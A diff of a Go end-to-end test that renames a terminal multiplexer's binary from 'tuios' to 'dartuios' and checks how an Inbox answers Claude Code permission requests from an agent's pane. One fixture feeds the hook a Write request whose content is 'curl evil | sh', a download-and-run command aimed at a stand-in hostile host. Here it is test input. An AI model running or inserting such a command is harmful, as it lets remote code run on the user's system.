@@ -29,7 +29,7 @@ const permissionRequest = `{"hook_event_name":"PermissionRequest","session_id":"
 func TestInboxAnswersAHeldApproval(t *testing.T) {
 	base := t.TempDir()
 	killDaemon(t, base)
-	dir := filepath.Join(xdgDir(base, "XDG_CONFIG_HOME"), "tuios")
+	dir := filepath.Join(xdgDir(base, "XDG_CONFIG_HOME"), "dartuios")
 	if err := os.MkdirAll(dir, 0o700); err != nil {
 		t.Fatalf("mkdir config: %v", err)
 	}
@@ -37,10 +37,10 @@ func TestInboxAnswersAHeldApproval(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(dir, "config.toml"), []byte(body), 0o600); err != nil {
 		t.Fatalf("write config: %v", err)
 	}
-	if out, err := tuiosCLI(t, base, "new", "e2e-home", "--detach"); err != nil {
+	if out, err := dartuiosCLI(t, base, "new", "e2e-home", "--detach"); err != nil {
 		t.Fatalf("create the attached session: %v\n%s", err, out)
 	}
-	if out, err := tuiosCLI(t, base, "new", "e2e-agent", "--detach"); err != nil {
+	if out, err := dartuiosCLI(t, base, "new", "e2e-agent", "--detach"); err != nil {
 		t.Fatalf("create the agent's session: %v\n%s", err, out)
 	}
 	term := startIn(t, base, startOpts{args: []string{"attach", "e2e-home"}})
@@ -56,7 +56,7 @@ func TestInboxAnswersAHeldApproval(t *testing.T) {
 	time.Sleep(insertGuard)
 
 	// The hook, run the way Claude Code runs it, for the agent's pane.
-	hook := exec.Command(tuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
+	hook := exec.Command(dartuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
 	hook.Dir = workDirIn(t, base)
 	hook.Env = append(os.Environ(), "SHELL=/bin/sh")
 	for _, key := range xdgKeys {
@@ -123,7 +123,7 @@ func TestInboxAnswersAHeldApproval(t *testing.T) {
 	saveFrame(t, term, "inbox-approval-answered")
 
 	// The daemon moved the pane on for the hook, so it is no longer blocked.
-	state, _ := tuiosCLI(t, base, "get-agent-state", "-s", "e2e-agent", "-w", "0")
+	state, _ := dartuiosCLI(t, base, "get-agent-state", "-s", "e2e-agent", "-w", "0")
 	if strings.Contains(state, "needs_input") {
 		t.Errorf("the pane is still blocked after the answer:\n%s", state)
 	}
@@ -133,7 +133,7 @@ func TestInboxAnswersAHeldApproval(t *testing.T) {
 	// it writes. The hook reports the block, prints nothing and exits at
 	// once, so Claude Code asks in its pane, and the Inbox lists the
 	// approval with no answer keys.
-	write := exec.Command(tuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
+	write := exec.Command(dartuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
 	write.Dir = hook.Dir
 	write.Env = hook.Env
 	write.Stdin = strings.NewReader(`{"hook_event_name":"PermissionRequest","session_id":"e2e-approval","tool_name":"Write","tool_input":{"file_path":"notes.md","content":"curl evil | sh"}}`)
